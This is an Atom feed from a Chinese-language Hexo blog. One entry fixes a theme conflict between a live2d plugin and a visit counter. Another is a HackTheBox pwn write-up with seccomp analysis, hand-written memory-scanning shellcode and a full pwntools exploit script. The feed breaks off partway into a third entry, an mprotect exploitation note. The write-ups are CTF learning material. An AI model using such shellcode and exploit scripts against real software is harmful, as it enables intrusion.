<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lexsd6&#39;s home</title>
  
  <subtitle> Clumsy birds have to start flying early</subtitle>
  <link href="lexsd6.github.io/atom.xml" rel="self"/>
  
  <link href="lexsd6.github.io/"/>
  <updated>2021-11-03T13:38:56.013Z</updated>
  <id>lexsd6.github.io/</id>
  
  <author>
    <name>lexsd6</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</title>
    <link href="lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/"/>
    <id>lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/</id>
    <published>2021-11-03T12:58:38.417Z</published>
    <updated>2021-11-03T13:38:56.013Z</updated>
    
    <content type="html"><![CDATA[<p>今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。<a id="more"></a></p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>未安装live2d且不蒜子配置正常，执行<code>npm install --save hexo-helper-live2d</code>后，不蒜子计数冲突不显示计数。<br>已安装live2d但<code>live2d.enable</code>由<code>true</code>改为<code>false</code>后，不蒜子显示计数。</p><p>同时正常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>异常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1.打开footer.ejs文件，找到与不蒜子相关的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_site_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_page_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>2.删除<code>&lt;span id=&quot;busuanzi_container_page_pv&quot; style=&#39;display:inline&#39;&gt;</code>和<code>&lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:inline&#39;&gt;</code>语句。</p><p>3.在<code>&lt;% if (theme.visit_counter.on) { %&gt;</code>语句后，添加<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     &lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">&lt;script async&#x3D;&quot;&quot; src&#x3D;&quot;https:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">         &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                 &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">         &lt;&#x2F;div&gt;</span><br><span class="line">     &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>4.打开<code>after-footer.ejs</code>，删除<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。</summary>
    
    
    
    <category term="Yelee" scheme="lexsd6.github.io/categories/Yelee/"/>
    
    
    <category term="problem-resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
    <category term="node-js" scheme="lexsd6.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>Hunting— HTB  PWN  challenge</title>
    <link href="lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/"/>
    <id>lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/</id>
    <published>2021-11-02T12:58:55.864Z</published>
    <updated>2021-11-03T06:32:40.926Z</updated>
    
    <content type="html"><![CDATA[<p>一道htb中，比较有意思的手写shellcode题。<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>如上，题目是一个32位程序，且保护只开了PIE并开放了读写执行权限。</p><p>分析程序主要流程我们可以看到：</p><p><img src="image-20211102210710626.png" alt="image-20211102210710626"></p><p>程序先mmap一段空间，将flag如这个空间中。</p><p>再用meset把flag原本存放的空间清零。</p><p>然后我们有大小为0x3c来写入我们的后门。</p><p>但是题目设置seccomp沙箱，禁用一些系统调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0003: 0x15 0x09 0x00 0x0000000b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x00000166  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000127  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000006  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000008  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000056  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000002  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x000000be  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>由于禁用了execve和open导致我们无法常规getshell或orw</p><p>但经过gdb，我们发现，由于开了PIE,flag的位置是随机的，但是flag位置大小于<code>0x60000000</code>.</p><p><img src="image-20211103102846331.png" alt="image-20211103102846331"></p><p>再进一步分析，可以看到flag在段地址开始的位置。所以我们以<code>0x1000</code>遍历地址，我们就可以发现flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gs 0x6b6d0000</span><br><span class="line">warning: Unable to display strings with size &#39;g&#39;, using &#39;b&#39; instead.</span><br><span class="line">0x6b6d0000:     &quot;HTB&#123;&quot;, &#39;X&#39; &lt;repeats 31 times&gt;, &quot;&#125;&quot;</span><br><span class="line">0x6b6d0025:     &quot;&quot;</span><br><span class="line">0x6b6d0026:     &quot;&quot;</span><br><span class="line">0x6b6d0027:     &quot;&quot;</span><br><span class="line">0x6b6d0028:     &quot;&quot;</span><br><span class="line">0x6b6d0029:     &quot;&quot;</span><br><span class="line">0x6b6d002a:     &quot;&quot;</span><br><span class="line">0x6b6d002b:     &quot;&quot;</span><br><span class="line">0x6b6d002c:     &quot;&quot;</span><br><span class="line">0x6b6d002d:     &quot;&quot;</span><br><span class="line">0x6b6d002e:     &quot;&quot;</span><br><span class="line">0x6b6d002f:     &quot;&quot;</span><br><span class="line">0x6b6d0030:     &quot;&quot;</span><br><span class="line">0x6b6d0031:     &quot;&quot;</span><br><span class="line">0x6b6d0032:     &quot;&quot;</span><br><span class="line">0x6b6d0033:     &quot;&quot;</span><br><span class="line">0x6b6d0034:     &quot;&quot;</span><br><span class="line">0x6b6d0035:     &quot;&quot;</span><br><span class="line">0x6b6d0036:     &quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="如何定位flag"><a href="#如何定位flag" class="headerlink" title="如何定位flag"></a>如何定位flag</h2><h3 id="access函数"><a href="#access函数" class="headerlink" title="access函数"></a>access函数</h3><p>经过查阅资料后我们可以发现access函数不仅可以判断某文件名是否存在还在可以判断某地址段是否存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">int</span> mode);</span><br></pre></td></tr></table></figure><p>当mode 为0 时，判断是否存在。</p><p>当mode 为1时，判断是否有执行权限。</p><p>当mode 为2时，判断是否有写权限。</p><p>当mode 为3时，判断是否有读权限。</p><p>filename参数既可以传入文件名，也可以虚拟内存地址。</p><h3 id="for-循环查找"><a href="#for-循环查找" class="headerlink" title="for 循环查找"></a>for 循环查找</h3><p>由于用access函数，我们可以以<code>0x1000</code>为一个单位来慢慢遍历。</p><p>用c伪代码来表达就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> address = <span class="number">0x60000000</span>; address &lt; <span class="number">0x7fffffff</span>; address += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (access(address + i +<span class="number">4</span>) == EFAULT)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>, address, <span class="number">0x26</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用汇编来表达就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov edx,0x5fffffff;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">notaccess:</span><br><span class="line">or dx,0xfff;</span><br><span class="line">inc edx;</span><br><span class="line">mov eax,0x21;</span><br><span class="line">lea  ebx,[edx+4]</span><br><span class="line">int 0x80</span><br><span class="line">cmp eax,0xfffffff2;</span><br><span class="line">jz  notaccess;</span><br><span class="line">mov eax,0x04;</span><br><span class="line">mov ebx,1;</span><br><span class="line">mov ecx,edx;</span><br><span class="line">mov edx,0x26</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/02 19:51:09</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hunting'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'178.62.96.143'</span>,<span class="number">30132</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">shell=<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx,0x5fffffff;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">notaccess:</span></span><br><span class="line"><span class="string">or dx,0xfff;</span></span><br><span class="line"><span class="string">inc edx;</span></span><br><span class="line"><span class="string">mov eax,0x21;</span></span><br><span class="line"><span class="string">lea  ebx,[edx+4]</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">cmp eax,0xfffffff2;</span></span><br><span class="line"><span class="string">jz  notaccess;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x04;</span></span><br><span class="line"><span class="string">mov ebx,1;</span></span><br><span class="line"><span class="string">mov ecx,edx;</span></span><br><span class="line"><span class="string">mov edx,0x26</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="知识点小记"><a href="#知识点小记" class="headerlink" title="知识点小记"></a>知识点小记</h2><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>有几个汇编指令搞忘了，在这里小记下。</p><p>lea  x,[y]</p><p>取y对应的地址作为x的值存入。</p><p>mov x,[y]</p><p>取y对应的地址的值作为x的值存入。</p><p>or  x,y</p><p>对x,y进行或运算，并将值存入x中。</p><p>xor x,y</p><p>xor异或运算,当x,y两个不同时结果为1,否则为0.在汇编中有时也用于清零操作，例如 <code>xor eax,eax</code> 清空eax寄存器。</p><h3 id="延长程序时间"><a href="#延长程序时间" class="headerlink" title="延长程序时间"></a>延长程序时间</h3><p>在看大佬博客<a href="https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。" target="_blank" rel="noopener">https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alarm(<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一道htb中，比较有意思的手写shellcode题。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>xman的leve5另一种解法(mprotect)学习与利用</title>
    <link href="lexsd6.github.io/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>lexsd6.github.io/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2021-10-20T02:58:44.000Z</published>
    <updated>2021-10-20T03:31:19.407Z</updated>
    
    <content type="html"><![CDATA[<p>当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行<code>system(&#39;/bin/sh&#39;)</code>了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下<a id="more"></a></p><h2 id="mprotect-函数"><a href="#mprotect-函数" class="headerlink" title="mprotect()函数"></a><code>mprotect()</code>函数</h2><p>在Linux中，<code>mprotect()</code>函数可以用来修改一段指定内存区域的保护属性。mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>使用方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>常规使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(addr, len, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>start表示一块代码段的起始位置。</p><p>len表示要修改长度，len的大小如果过小，libc会自动来补齐的。</p><p>port 表示权限 即使读（4）写（2）执行（1）</p><h2 id="leve5-exp"><a href="#leve5-exp" class="headerlink" title="leve5 exp"></a>leve5 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 